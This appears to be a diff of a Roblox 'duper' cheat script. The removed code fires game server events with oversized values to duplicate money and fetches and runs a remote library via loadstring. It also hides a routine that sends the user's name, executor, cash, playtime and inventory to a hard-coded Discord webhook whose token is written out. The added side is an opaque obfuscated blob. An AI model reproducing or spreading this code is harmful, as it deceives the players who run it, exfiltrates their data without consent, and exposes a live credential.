@@ -1,118 +1,1 @@
-    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
-local Window = Rayfield:CreateWindow({
-   Name = "AnomixDuper V.1",
-   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
-   LoadingTitle = "AnomixDuper Loaded!",
-   LoadingSubtitle = "Duper that actually works.",
-   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
-
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "Big Hub"
-   },
-
-   Discord = {
-      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
-      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
-      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
-   },
-
-   KeySystem = false, -- Set this to true to use our key system
-   KeySettings = {
-      Title = "Untitled",
-      Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
-      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
-   }
-})
-
-local Tab = Window:CreateTab("Main")
-
-
-
-local Button = Tab:CreateButton({
-    Name = "Dupe 500K (Resets Money)",
-    Callback = function()
- 
-    for i,v in pairs(workspace.PlayerVehicles:GetChildren()) do
-        game:GetService("ReplicatedStorage")["_CS.Events"].FillUpCar:FireServer(v, 9e9)
-    end
-    wait(.2)
-
-    local events = game:GetService("ReplicatedStorage"):WaitForChild("_CS.Events")
-    events.FullRecoloring:FireServer("B")
-    print("skibidi saka")
-
-end})
-
-
-function SendMessageEMBED(url, embed)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local data = {
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["description"] = embed.description,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = embed.footer.text
-                }
-            }
-        }
-    }
-    local body = http:JSONEncode(data)
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
--- Examples
-local url = "https://discord.com/api/webhooks/1323737173681242143/jvlOgbPcfbC4gTDfL8_3AXwF-ada8OYJfP9nazQqC_odBXrIxqrFuoYGG4LSYuoeyHhc"
-local Executor = identifyexecutor()
-local ServerAge = game.ReplicatedStorage.ServerRunTime.Value
-
-local BackpackItems = {}
-for i, v in pairs(game.Players.LocalPlayer.PlayerGui.MainUIHolder.Menus.BackpackGUI.Basic.ItemBase.ItemGrid:GetChildren()) do
-    if v.Name ~= "UIGridLayout" then
-        table.insert(BackpackItems, v.Name)
-    end
-end
-
-local embed = {
-    ["title"] = game.Players.LocalPlayer.Name,
-    ["description"] = "Executor: " .. Executor,
-    ["color"] = 65280,
-    ["fields"] = {
-        {
-            ["name"] = "Money:",
-            ["value"] = game.Players.LocalPlayer.PlayerGui.MainUIHolder.MenuBar.CashDisplay.Text
-        },
-        {
-            ["name"] = "Playtime:",
-            ["value"] = game.Players.LocalPlayer.PlayerGui.MainUIHolder.Menus.SettingsGUI.Settings.Playtime.Counter.Text
-        },
-        {
-            ["name"] = "Backpack content:",
-            ["value"] = table.concat(BackpackItems, ", ")
-        },
-    },
-    ["footer"] = {
-        ["text"] = "Server age: " .. ServerAge
-    }
-}
-SendMessageEMBED(url, embed)
+([[This file was protected with BinSec V1]])(yT\L5C2rQY(oYPiɻPw}_fU_Px)`j[{&[qEGKyF\oo]~BT\iPFUeUzIQb^PYcNbQXlIk~pm?jMaqLuBan_UHKBBi`QVsn_wQIPL`J`}xrpODxJsdr$FyqblIeBVH0RVJRtJ]qq|NrܶNBhQwHVSIVhSa>V\hhM`U`aKnY]mlzxϯXtyxVJCIdSLٯLG|iBB@maTNc1vsYY\>zn]DUY_}TZmtXIrnGMI}wwYWߢf`DfTJjNTQqoVawoRpJNw`MteqJ~\ZrQKVgB[cczm@aZ{N@uNJy^]}KwQUri|n`x\A{mkoRYOZ}usGXx{N@wJEZ}NZYg$aI}ThmktXanSiE[KcSd|rJCPFCshxBZYgMBH"uQpI^aźcsyvclJhIo~h\UL>eMCB]ENj:BnHir\2glmYJjcPbIh4tbKQIj\KbqbFbaCVIqCsU`LfnnCB`EDTZQ`oVEu\Usq1Vm`annds@RiS@}CuD@Ki~IItRU\[K]+PSkoi|fkj]GbH\dtrxJd^zjlDrNSC@6C|yT{KUa\rJZ@bnEHBy|UcwvSHwa^nTd}F|qQcwNtRzGYv4Oqi|oIP^w\Psp]{vh~TS~Y[@pWM`ZXlnw@zCyFnJ+^mhUmc@w~tUJH߽IsoN@kmd]XRLt~Ԭws9B\u}xUnkCYoen|}ydpR@sQXoM۱xRO{m[rpVRSXuT_uM)Afhoʹ~yesd]zb]}`@MwJl\pqwetic@ltJQyBpm8}^LvMOfy@UqI`t\Ko{~c~QY@`QzMgC^}gy}QIEH\LFYǧKhY8Pn}HAġna7@qzbyA|pa@fg~[truDGoguJhdFs^O@Far[NDUsUVkqhBM~tAtep`D_VPPXTBZfBzO_QZcKH[[_sR~O}/Lj`|rnqH{ksp^LqHTra_pwnmLjJrCqZ~@kDEUwNqtwIwchwZhkf|eKvdnGdT]]\fOg"Jse~nDJ~xJEyXӸS_@tThIHgp)L`upQ^l}ɡFrAkLjsNA~xkdnvc{lDgI^`TagGYvbuhfdyelEvth]^R\v[iIfhHbqwGZbcRcluugktBjxHQQtCXT_u{ZVQ`}@̪frv~ZG]@OznaFk|ryqR{\RIk\Hk]vLHʲ`׽PvQrk{DOGqxM{vUsyakViQRQjqQOQc`\IjLUyCVImuʤZLVuJt]Jy~pqR\INJDrUEiZiPVN[z2{uUBXk[hFVIRONy^`lQwiLs]ZHnubMJTB\Rtg*dnm}q5}BIh]xGnKa{wiaynodor|E`DũmUgAaC[QZtsHiLtkPgAHj]bSSnxgu>dlPdaqtSL@1QR^{rLVm`}M_erU%VZg]fL1wbIPwVi^eq
